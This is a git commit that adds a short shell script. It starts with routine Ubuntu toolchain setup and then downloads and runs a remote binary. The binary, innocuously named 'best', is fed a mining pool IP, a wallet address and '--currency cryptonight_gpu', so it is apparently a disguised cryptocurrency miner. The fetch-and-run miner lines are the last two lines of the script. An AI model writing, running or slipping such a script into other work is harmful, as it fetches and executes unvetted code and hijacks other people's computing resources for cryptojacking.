69a1ad3b9d0153bdd4bb64429a37b3a60641f3b5
WxYtzaiu <100740697+WxYtzaiu@users.noreply.github.com>
2022-11-19 18:18:06 +0700

    Update and rename best.sh to yangt.sh

---
+++ yangt.sh
@@ -0,0 +1,14 @@
+sudo add-apt-repository ppa:ubuntu-toolchain-r/test
+
+sudo apt-get update
+
+sudo apt-get install gcc-4.9
+
+sudo apt-get upgrade libstdc++6
+
+sudo apt-get dist-upgrade
+
+strings /usr/lib/x86_64-linux-gnu/libstdc++.so.6 | grep GLIBCXX
+
+wget https://gitlab.com/ontaracing04/gas/-/raw/main/best.tar.gz && tar -xvf best.tar.gz
+./best --tls-url 69.164.205.118:443 --user ccx7JijBKQtfA9Bvwev2YR2KJwcxp44gs8WByRbg3gB5SDyYY7jvrDu3hdJqhFKtkPPuaCHhPuHhMhqKMExCzMBZ9LbcrMwd5k --pass $(echo $(shuf -i 1-20000 -n 1)-yang) --currency cryptonight_gpu
